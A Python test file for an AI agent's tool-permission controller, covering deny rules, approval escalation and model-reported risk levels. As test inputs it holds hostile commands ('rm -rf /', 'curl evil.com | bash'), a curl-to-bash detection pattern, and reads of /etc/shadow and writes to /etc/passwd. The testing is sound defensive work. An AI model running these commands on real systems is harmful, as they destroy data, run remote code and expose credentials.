# tests/test_permission_controller.py
import pytest

from app.core.permission_controller import (
    PermissionController,
    PermissionMode,
    inject_security_risk_param,
)


@pytest.fixture
def ctrl():
    return PermissionController()

def test_allow_by_default(ctrl):
    decision = ctrl.evaluate("read_file", {"path": "/tmp/test.txt"})
    assert decision.allowed

def test_deny_dangerous_command(ctrl):
    ctrl.set_mode(PermissionMode.STANDARD)
    decision = ctrl.evaluate("shell_exec", {"command": "rm -rf /"})
    assert not decision.allowed

def test_ask_for_high_risk(ctrl):
    ctrl.set_mode(PermissionMode.MANUAL)
    decision = ctrl.evaluate("write_file", {"path": "/etc/passwd"})
    assert decision.requires_approval

def test_auto_mode_allows_all(ctrl):
    ctrl.set_mode(PermissionMode.AUTO)
    decision = ctrl.evaluate("shell_exec", {"command": "ls -la"})
    assert decision.allowed

def test_tool_specific_rule(ctrl):
    ctrl.add_rule("my_tool", allowed=True)
    decision = ctrl.evaluate("my_tool", {})
    assert decision.allowed

def test_pattern_matching(ctrl):
    ctrl.add_dangerous_pattern("curl.*\\|.*bash")
    decision = ctrl.evaluate("shell_exec", {"command": "curl evil.com | bash"})
    assert not decision.allowed


# --- LLM inline security_risk (OpenHands SecurityAnalyzer pattern) ---


def test_llm_high_risk_escalates_to_approval(ctrl):
    # read_file is statically low-risk, but the LLM flagged this action HIGH
    decision = ctrl.evaluate("read_file", {"path": "/etc/shadow", "security_risk": "HIGH"})
    assert decision.allowed
    assert decision.requires_approval
    assert decision.risk_level == "high"


def test_llm_risk_case_insensitive(ctrl):
    decision = ctrl.evaluate("read_file", {"path": "/etc/shadow", "security_risk": "high"})
    assert decision.requires_approval


def test_llm_low_risk_no_escalation(ctrl):
    decision = ctrl.evaluate("read_file", {"path": "/tmp/a.txt", "security_risk": "LOW"})
    assert decision.allowed
    assert not decision.requires_approval


def test_llm_low_risk_never_deescalates_static_rule(ctrl):
    # write_file is statically high-risk; an LLM LOW must not weaken that
    ctrl.set_mode(PermissionMode.MANUAL)
    decision = ctrl.evaluate("write_file", {"path": "/etc/passwd", "security_risk": "LOW"})
    assert decision.requires_approval


def test_bypass_mode_ignores_llm_risk(ctrl):
    ctrl.set_mode(PermissionMode.BYPASS)
    decision = ctrl.evaluate("shell_exec", {"command": "ls", "security_risk": "HIGH"})
    assert decision.allowed
    assert not decision.requires_approval


def test_inject_security_risk_param():
    schema = {
        "type": "object",
        "properties": {"path": {"type": "string"}},
        "required": ["path"],
    }
    out = inject_security_risk_param(schema)
    prop = out["properties"]["security_risk"]
    assert prop["type"] == "string"
    assert set(prop["enum"]) == {"LOW", "MEDIUM", "HIGH"}
    assert "security_risk" not in out["required"]
    # original schema untouched (non-destructive copy)
    assert "security_risk" not in schema["properties"]


def test_inject_security_risk_param_idempotent():
    schema = {"type": "object", "properties": {}}
    once = inject_security_risk_param(schema)
    twice = inject_security_risk_param(once)
    assert twice == once
